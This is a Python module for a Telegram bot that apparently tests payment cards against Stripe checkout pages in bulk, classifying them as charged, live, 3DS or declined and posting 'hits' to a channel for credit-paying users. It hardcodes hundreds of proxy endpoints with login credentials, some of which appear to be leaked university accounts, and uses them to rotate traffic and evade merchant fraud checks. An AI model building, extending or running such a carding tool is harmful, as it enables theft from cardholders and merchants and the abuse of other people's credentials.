import re
import time
import html
import asyncio
import logging
from typing import List, Dict, Optional, Any

from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest

from database import get_user_credits, update_credits, create_user
from autohitters.hit import run_hit_check


router = Router()
logger = logging.getLogger(__name__)


MAX_CARDS         = 10
PARALLEL_LIMIT    = 1
UPDATE_EVERY      = 10
RESULTS_PER_PAGE  = 10
HIT_CHANNEL_ID    = -1003744006874
BOT_URL           = "https://t.me/Try_Low"
MAX_PROXY_RETRIES = 3

STCO_SESSIONS: Dict[int, Dict[str, Any]] = {}


PROXIES = [
    # ── Raw IPs ──
    "103.156.91.173:58798:zqrn9y5d:zQRN9y5d",
    "103.161.113.230:18491:dz46cabj:ksuRcKlNqJMU",
    "103.183.121.128:58122:3dfw7c6x:oSeqx0CNeV0k",
    "103.183.121.211:11657:azqdr5vn:71WCPuMwyc72",
    "103.183.121.59:34219:y7g4dd8d:Buw96jtGFKA5",
    "103.204.108.142:12345:naveed:Qwerty_123ABC",
    "103.204.109.189:12345:tickets:proxyon145",
    "104.160.17.116:12345:tickets:proxyon145",
    "107.150.71.197:12345:tickets:proxyon145",
    "107.150.71.30:12345:tickets:proxyon145",
    "107.172.241.122:12345:tickets:proxyon145",
    "107.173.112.194:12345:tickets:proxyon145",
    "135.148.117.75:59813:oldg6k2r:oLdG6k2R",
    "138.94.218.193:12345:tickets:proxyon145",
    "153.121.71.115:822:socialwire:87xb2kziRk4xa",
    "161.0.1.119:12345:tickets:proxyon145",
    "161.0.1.13:12345:tickets:proxyon145",
    "162.212.170.252:12345:tickets:proxyon145",
    "162.212.170.77:12345:tickets:proxyon145",
    "168.228.46.128:12345:tickets:proxyon145",
    "168.228.46.189:12345:tickets:proxyon145",
    "175.29.133.8:5433:799JRELTBPAE:F7BQ7D3EQSQA",
    "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "181.177.102.240:12345:tickets:proxyon145",
    "181.215.16.247:12345:tickets:proxyon145",
    "185.122.170.10:12345:tickets:proxyon145",
    "185.122.170.73:12345:tickets:proxyon145",
    "190.123.219.12:12345:tickets:proxyon145",
    "190.123.219.34:12345:tickets:proxyon145",
    "191.102.165.164:12345:tickets:proxyon145",
    "192.227.238.145:12345:tickets:proxyon145",
    "193.254.17.97:64708:1DnugnypC:4yPtzMd3f",
    "194.33.9.114:64170:nWtrJqsb:RYYEE72Y",
    "194.33.9.136:49520:nWtrJqsb:RYYEE72Y",
    "196.196.23.136:12345:tickets:proxyon145",
    "196.196.23.45:12345:tickets:proxyon145",
    "196.244.48.124:12345:naveed:Qwerty_123ABC",
    "196.244.48.126:12345:naveed:Qwerty_123ABC",
    "196.244.48.26:12345:naveed:Qwerty_123ABC",
    "196.247.205.113:12345:tickets:proxyon145",
    "196.247.205.228:12345:tickets:proxyon145",
    "196.247.205.48:12345:tickets:proxyon145",
    "196.247.205.88:12345:tickets:proxyon145",
    "196.247.205.91:12345:tickets:proxyon145",

    # ── 202.28.17.8 — Thai university pool ──
    "202.28.17.8:8080:s5802016810053:1549900215617",
    "202.28.17.8:8080:s6003026810028:1720800122226",
    "202.28.17.8:8080:s6202052810029:78496978",
    "202.28.17.8:8080:s6301074610292:za0643250344",
    "202.28.17.8:8080:s6402011520288:surikan123",
    "202.28.17.8:8080:s6402013510115:s1609900520681",
    "202.28.17.8:8080:songponp:neung1nakub",

    # ── More raw IPs ──
    "23.104.162.39:12345:tickets:proxyon145",
    "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
    "45.145.162.63:58536:nWtrJqsb:RYYEE72Y",
    "5.157.5.100:12345:tickets:proxyon145",
    "5.157.5.154:12345:tickets:proxyon145",
    "5.249.177.8:5433:9T1GYK9U3S2B:SAWF8Y0JHSB0",
    "50.3.137.165:12345:tickets:proxyon145",
    "50.3.137.177:12345:tickets:proxyon145",
    "51.195.198.170:36647:fwos7n0b:fWOS7n0B",
    "82.117.94.14:63126:RrkJjUqfT:jYEH6Emdg",

    # ── pvdata.host pool (shared creds) ──
    "ae-dub.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "at-wie.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-bri.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-mel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "au-per.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "be-bru.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "bg-sof.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "br-sao.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ca-van.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ch-zur.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cy-lim.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "de-fra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "gr-ath.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "im-bal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "in-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "is-rey.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "it-mil.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "kr-seo.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lt-sia.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "lu-lux.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "mx-mex.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "no-osl.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "pt-lis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "rs-bel.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-got.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-kis.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "se-sto.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "sg-sin.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "th-ban.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "tw-tai.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "ua-nik.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-lon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "uk-man.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "vn-hoc.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
    "za-joh.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",

    # ── g-w.info free proxies ──
    "ca-free-proxy.g-w.info:59785:diehard33:3liubjnixc8456789i",
    "de-free-proxy.g-w.info:59784:smoothysuck:ublIUnbiybkvDfgg",
    "in-free-proxy.g-w.info:59783:dagandnorb:EdsAbQuamAn999",
    "uk-free-proxy.g-w.info:59782:meetthejack:8ohlsid7hlPenEdsAbQ",
    "us-free-proxy.g-w.info:59781:user3proxyserver:huccuAn_oc7o87hubhjYY",

    # ── University proxies ──
    "authproxy.fju.edu.tw:3128:506061324:enya07141013",
    "proxy.sru.ac.th:8080:6115103001019:1819900293950",
    "proxy.sru.ac.th:8080:64052511005:3820800334521",
    "proxy.sru.ac.th:8080:jantawan.ban:jantawan.ban",
    "proxy.sru.ac.th:8080:patarawan.kah:patarawan.kah",
    "proxy.sru.ac.th:8080:prairat.kon:24122529**",
    "proxy.ttu.edu.tw:3128:g10701005:j0i2m2",

    # ── cactussstp.com — au1 ──
    "au1.cactussstp.com:81:bvmbsmie:shibby2511",
    "au1.cactussstp.com:81:hughmuir2:lisamarie11",
    "au1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "au1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "au1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "au1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "au1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "au1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ca1 ──
    "ca1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ca1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ca1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ca1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ch1 ──
    "ch1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:81:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "ch1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ch1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ch1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "ch1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── es1 ──
    "es1.cactussstp.com:81:bvmbsmie:shibby2511",
    "es1.cactussstp.com:81:hughmuir2:lisamarie11",
    "es1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:81:yefprelf:dr2gsmab",
    "es1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "es1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "es1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "es1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "es1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "es1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "es1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── in1 ──
    "in1.cactussstp.com:81:bvmbsmie:shibby2511",
    "in1.cactussstp.com:81:hughmuir2:lisamarie11",
    "in1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:81:yefprelf:dr2gsmab",
    "in1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "in1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "in1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "in1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "in1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "in1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "in1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── it1 ──
    "it1.cactussstp.com:81:bvmbsmie:shibby2511",
    "it1.cactussstp.com:81:hughmuir2:lisamarie11",
    "it1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "it1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "it1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "it1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── lv1 ──
    "lv1.cactussstp.com:81:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:81:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:81:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "lv1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "lv1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "lv1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "lv1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── my1 ──
    "my1.cactussstp.com:81:bvmbsmie:shibby2511",
    "my1.cactussstp.com:81:hughmuir2:lisamarie11",
    "my1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "my1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "my1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "my1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "my1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "my1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── pt1 ──
    "pt1.cactussstp.com:81:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:81:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:81:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:3129:yefprelf:dr2gsmab",
    "pt1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "pt1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "pt1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
    "pt1.cactussstp.com:8080:yefprelf:dr2gsmab",

    # ── ro1 ──
    "ro1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ro1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ro1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ro1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── ru1 ──
    "ru1.cactussstp.com:81:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:81:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "ru1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "ru1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "ru1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk2 ──
    "uk2.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── uk3 ──
    "uk3.cactussstp.com:81:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:81:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "uk3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "uk3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "uk3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us1 ──
    "us1.cactussstp.com:81:bvmbsmie:shibby2511",
    "us1.cactussstp.com:81:hughmuir2:lisamarie11",
    "us1.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us1.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us1.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us1.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us1.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us1.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us2 ──
    "us2.cactussstp.com:81:bvmbsmie:shibby2511",
    "us2.cactussstp.com:81:hughmuir2:lisamarie11",
    "us2.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us2.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us2.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us2.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us2.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us2.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us3 ──
    "us3.cactussstp.com:81:bvmbsmie:shibby2511",
    "us3.cactussstp.com:81:hughmuir2:lisamarie11",
    "us3.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us3.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us3.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us3.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us3.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us3.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us4 ──
    "us4.cactussstp.com:81:bvmbsmie:shibby2511",
    "us4.cactussstp.com:81:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us4.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us4.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us4.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us4.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us6 ──
    "us6.cactussstp.com:81:bvmbsmie:shibby2511",
    "us6.cactussstp.com:81:hughmuir2:lisamarie11",
    "us6.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:3129:bvmbsmie:shibby2511",
    "us6.cactussstp.com:3129:hughmuir2:lisamarie11",
    "us6.cactussstp.com:3129:uncpjndo:w77Ebc0h2A",
    "us6.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us6.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us6.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",

    # ── us9 ──
    "us9.cactussstp.com:81:bvmbsmie:shibby2511",
    "us9.cactussstp.com:81:hughmuir2:lisamarie11",
    "us9.cactussstp.com:81:uncpjndo:w77Ebc0h2A",
    "us9.cactussstp.com:8080:bvmbsmie:shibby2511",
    "us9.cactussstp.com:8080:hughmuir2:lisamarie11",
    "us9.cactussstp.com:8080:uncpjndo:w77Ebc0h2A",
]


EMOJI_CHARGED  = "5427168083074628963"
EMOJI_LIVE     = "6100515480735321747"
EMOJI_3DS      = "5273914604752216432"
EMOJI_DECLINED = "5273914604752216432"
EMOJI_STOP     = "6100541628496219252"

def _safe_amount(raw: Any, currency: str) -> str:
    """Convert Stripe cents integer to a human-readable string."""
    if not raw:
        return "N/A"
    try:
        amt = float(raw)
        if amt == 0:
            return "Trial"
        if currency.upper() in ("JPY", "KRW", "VND", "IDR"):
            return f"{int(amt)} {currency.upper()}"
        return f"{amt / 100:.2f} {currency.upper()}"
    except (ValueError, TypeError):
        return "N/A"


def _domain_from_url(url: str) -> str:
    """Return just the hostname (e.g. replit.com) from any URL."""
    try:
        from urllib.parse import urlparse
        host = urlparse(url).hostname or ""
        return host[4:] if host.startswith("www.") else host
    except Exception:
        return url[:40]


def _fmt(msg: str, code: str) -> str:
    """
    Canonical display string: "{message} ({code})"
    e.g. "Your card was declined. (generic_decline)"
    """
    msg  = (msg or "").strip()
    code = (code or "unknown").strip().lower()
    if msg and not msg.endswith("."):
        msg += "."
    return f"{msg} ({code})" if msg else f"({code})"


def _result(card, status, code, display, emoji, amount, currency, is_hit=False, merchant="") -> dict:
    return {
        "card":     card,
        "status":   status,
        "code":     code,
        "display":  display,
        "emoji":    emoji,
        "amount":   amount,
        "currency": currency,
        "is_hit":   is_hit,
        "merchant": merchant,
    }


_CODE_KEYS = ("decline_code", "declineCode", "error_code", "errorCode", "code")

_PI_STATUS_CODES = {
    "requires_payment_method": "generic_decline",
    "requires_action":         "authentication_required",
    "requires_confirmation":   "requires_confirmation",
    "processing":              "processing",
    "succeeded":               "succeeded",
    "complete":                "succeeded",
    "canceled":                "canceled",
}


_CAPTCHA_CODES = {
    "captcha_required", "hcaptcha_required", "captcha_failed",
    "verification_failed", "invalid_captcha", "challenge_failed",
}
_3DS_CODES = {
    "authentication_required", "3d_secure_required", "3ds_required",
    "payment_3ds_failure", "generic_3ds_failed", "three_d_secure",
}

_TRAILING_CODE_RE = re.compile(r"\s*[\(\[][a-z0-9_\- ]+[\)\]]\s*$", re.I)


_CANONICAL_MESSAGES = {
    "generic_decline":           "Your card was declined",
    "do_not_honor":              "Your card was declined",
    "fraudulent":                "Your card was declined",
    "lost_card":                 "Your card was declined",
    "stolen_card":               "Your card was declined",
    "transaction_not_allowed":   "Your card was declined",
    "insufficient_funds":        "Your card has insufficient funds",
    "incorrect_cvc":             "Your card's security code is incorrect",
    "invalid_cvc":               "Your card's security code is invalid",
    "incorrect_number":          "Your card number is incorrect",
    "invalid_number":            "Your card number is invalid",
    "expired_card":              "Your card has expired",
    "incorrect_pin":             "Your card's PIN is incorrect",
    "incorrect_zip":             "Your card's ZIP code is incorrect",
    "invalid_expiry_month":      "Your card's expiration month is invalid",
    "invalid_expiry_year":       "Your card's expiration year is invalid",
    "card_velocity_exceeded":    "Your card has been used too many times in a short period",
    "card_not_supported":        "Your card does not support this type of purchase",
    "currency_not_supported":    "Your card does not support this currency",
    "duplicate_transaction":     "Duplicate transaction",
    "amount_too_large":          "The charge amount is too large",
    "amount_too_small":          "The charge amount is too small",
    "processing_error":          "An error occurred while processing your card",
    "payment_intent_authentication_failure": "The payment method failed authentication",
    "authentication_required":   "3D Secure authentication required",
    "3d_secure_required":        "3D Secure authentication required",
    "3ds_required":              "3D Secure authentication required",
    "payment_3ds_failure":       "The payment method failed authentication",
    "generic_3ds_failed":        "The payment method failed authentication",
    "three_d_secure":            "3D Secure authentication required",
    "captcha_required":          "Stripe hcaptcha challenge triggered",
    "hcaptcha_required":         "Stripe hcaptcha challenge triggered",
    "captcha_failed":            "Stripe hcaptcha challenge triggered",
    "verification_failed":       "Stripe hcaptcha challenge triggered",
    "invalid_captcha":           "Stripe hcaptcha challenge triggered",
    "challenge_failed":          "The 3D Secure challenge could not be completed",
    "checkout_not_active_session": "Checkout session is no longer active",
    "invalid_session":           "Checkout session is no longer active",
    "api_error":                 "Checkout API error",
    "checkout_failed":           "Checkout failed",
    "pk_extract_failed":         "Could not extract the publishable key",
    "pm_creation_failed":        "Could not create the payment method",
    "invalid_session_id":        "Checkout session is no longer active",
    "proxy_error":               "Proxy error",
    "timeout":                   "Request timed out",
    "connection_error":          "Connection error",
    "succeeded":                 "Payment successful",
    "processing":                "Payment is processing",
}


_VAGUE_WORDS = {
    "", "dead", "die", "dying", "declined", "decline", "declin", "genric",
    "generic", "genral", "generl", "genericl", "error", "err", "failed",
    "fail", "failure", "rejected", "reject", "denied", "deny", "unknown",
    "none", "null", "n/a", "na", "bad", "false", "falsecard", "invalid",
    "not enough funds", "no", "no card", "card", "payment", "transaction",
}


_TYPO_FIXES = (
    ("genric", "generic"), ("genaric", "generic"), ("generik", "generic"),
    ("generick", "generic"), ("genral", "generic"), ("generl", "generic"),
    ("genericl", "generic"), ("generilc", "generic"), ("gneric", "generic"),
    ("declin", "decline"), ("decline", "decline"), ("rejected", "rejected"),
    ("insufficiant", "insufficient"), ("insufcient", "insufficient"),
    ("insufficent", "insufficient"), ("expierd", "expired"),
    ("fraudulant", "fraudulent"), ("verifcation", "verification"),
)


def _fix_typos(text: str) -> str:
    """Correct the misspelling variants the gateway echoes back."""
    out = text or ""
    for bad, good in _TYPO_FIXES:
        out = re.sub(rf"\b{bad}\b", good, out, flags=re.I)
    return out


def _is_vague_message(msg: str, code: str) -> bool:
    """
    True when the message only restates the decline code (or is filler),
    so the canonical wording is more useful than the echo.
    """

    text = re.sub(r"[_\-]+", " ", msg or "")
    words = [w for w in re.sub(r"[^a-z0-9\s]+", " ", _fix_typos(text).lower()).split() if w]
    if not words:
        return True

    if all(w in _VAGUE_WORDS for w in words):
        return True

    code_words = [w for w in _clean_code(code).split("_") if w]
    if code_words and sorted(words) == sorted(code_words):
        return True

    if len("".join(words)) <= 3:
        return True
    return False


def _normalise_message(msg: str, code: str) -> str:
    """
    Return a message worth showing for `code`.

    Falls back to the canonical Stripe wording whenever the gateway echo is
    vague, empty, or just a typo'd copy of the code.
    """
    canonical = _CANONICAL_MESSAGES.get(_clean_code(code), "")
    cleaned = _strip_trailing_code(msg).strip()
    if not cleaned:
        return canonical
    if canonical and _is_vague_message(cleaned, code):
        return canonical
    if not canonical:
        return cleaned
    return cleaned


_COARSE_CODES = {
    "charge": "succeeded", "charged": "succeeded", "live": "insufficient_funds",
    "dead": "generic_decline", "declined": "generic_decline", "error": "api_error",
}


def _clean_code(val: Any) -> str:
    """Normalise a raw code value into a bare lowercase token."""
    if val is None:
        return ""
    code = str(val).strip().lower()
    code = code.strip("()[]{} \t\"'")
    return re.sub(r"\s+", "_", code)[:60]


def _code_from_obj(obj: Any) -> str:
    """Pull the first usable decline code out of a dict (breadth-first)."""
    if not isinstance(obj, dict):
        return ""
    for key in _CODE_KEYS:
        code = _clean_code(obj.get(key))

        if code and code not in {"ok", "true", "false", "1", "0", "none", "null"}:
            return code
    return ""


def _find_pi_status(obj: Any, depth: int = 0) -> str:
    """Locate a PaymentIntent-style status string anywhere in the body."""
    if depth > 4:
        return ""
    if isinstance(obj, dict):
        for key in ("status", "pi_status", "intent_status"):
            val = str(obj.get(key) or "").strip().lower()
            if val in _PI_STATUS_CODES:
                return val
        for val in obj.values():
            found = _find_pi_status(val, depth + 1)
            if found:
                return found
    elif isinstance(obj, list):
        for item in obj[:5]:
            found = _find_pi_status(item, depth + 1)
            if found:
                return found
    return ""


def _extract_decline_code(raw: Any, result_msg: str, api_status: str) -> str:
    """
    Recover the gateway's real decline code from hit.php's raw body.

    Falls back through: direct error object → last_payment_error →
    payment-intent status → any nested code field → code already embedded in the
    message → the coarse api_status.
    """
    body = raw if isinstance(raw, dict) else {}


    def _deep_code(node: Any, depth: int = 0) -> str:
        if not isinstance(node, dict) or depth > 4:
            return ""
        code = _code_from_obj(node)
        if code:
            return code
        for key in ("error", "last_payment_error", "last_error", "response",
                    "payment_intent", "payment_method"):
            if key in node:
                code = _deep_code(node[key], depth + 1)
                if code:
                    return code
        for val in node.values():
            if isinstance(val, dict):
                code = _deep_code(val, depth + 1)
                if code:
                    return code
        return ""

    for holder in ("error", "last_payment_error", "last_error", "response", "payment_intent"):
        if holder in body:
            code = _deep_code(body[holder])
            if code:
                return code


    pi_status = _find_pi_status(body)
    if pi_status:
        return _PI_STATUS_CODES[pi_status]


    code = _code_from_obj(body)
    if code:
        return code


    m = re.search(r"[\(\[]\s*([a-z0-9_\-]{3,})\s*[\)\]]\s*$", (result_msg or "").lower())
    if m:
        return _clean_code(m.group(1))


    return _clean_code(api_status) or "declined"


def _semantic_code(code: str, default: str) -> str:
    """
    Replace a coarse hit.php status with a real-looking code.

    Only the fallback path produces codes like "dead"; a genuine
    decline_code from the gateway is always kept as-is.
    """
    code = _clean_code(code)
    return _COARSE_CODES.get(code, code) or default


